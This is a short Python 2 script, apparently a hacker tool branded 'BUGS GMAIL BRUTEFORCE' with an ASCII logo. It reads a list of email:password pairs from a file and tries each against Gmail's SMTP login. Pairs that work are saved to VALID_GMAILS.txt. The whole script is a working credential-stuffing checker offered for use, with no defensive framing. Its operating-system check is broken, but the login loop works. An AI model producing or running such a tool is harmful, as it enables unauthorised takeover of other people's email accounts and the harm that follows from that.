#!/usr/bin/python
#coding: utf-8

# ( -- IMPORTS -- ) #
import smtplib, time, os

# ( -- LOGO / INFO -- ) #
back = '''
    ____   ____ __  __    _    ___ _          ____  _____ 
   / __ \ / ___|  \/  |  / \  |_ _| |        | __ )|  ___|
  / / _` | |  _| |\/| | / _ \  | || |   _____|  _ \| |_   
 | | (_| | |_| | |  | |/ ___ \ | || |__|_____| |_) |  _|  
  \ \__,_|\____|_|  |_/_/   \_\___|_____|    |____/|_|    
   \____/                                                 
\n[$] BUGS GMAIL BRUTEFORCE.
[$] URL = ("https://www.Brazzers.com/BUGS").
[$] SCRIPT PROGRAMMED BY BUGS WITH PYTHON2.
'''
# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #
print back
print ''

if os.system == 'Linux':
	os.system('clear')
elif os.system == 'Windows':
	os.system('cls')
else:
	pass

def log(email, pas):
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(email, pas)
		print '[X] LOGGED IN / OPENED SUCCESSFULLY ['+email+':'+pas+'] .!'
		open('VALID_GMAILS.txt','a+').write(email+':'+pas+'\n')
	except smtplib.SMTPAuthenticationError as a:
		SMTPAuthenticationError = str(a)
		if 'https://accounts.google.com/sign' in SMTPAuthenticationError:
			print '[X] LOGGED IN SUCCESSFULLY ['+email+':'+pas+'] .!'
		elif 'Username and Password not accepted' in SMTPAuthenticationError:
			print '[X] LOGIN FAILED ['+email+':'+pas+'] .!'
		else:
			print '[X] UNKNOWN LOGIN ['+email+':'+pas+'] .!'
			pass

emails_file = raw_input('[X] ENTER YOUR GMAILS FILE X> ')
print ''

for full in open(emails_file,'r'):
	full = full.strip()
	mail, passwd = full.split(':')
	log(mail, passwd)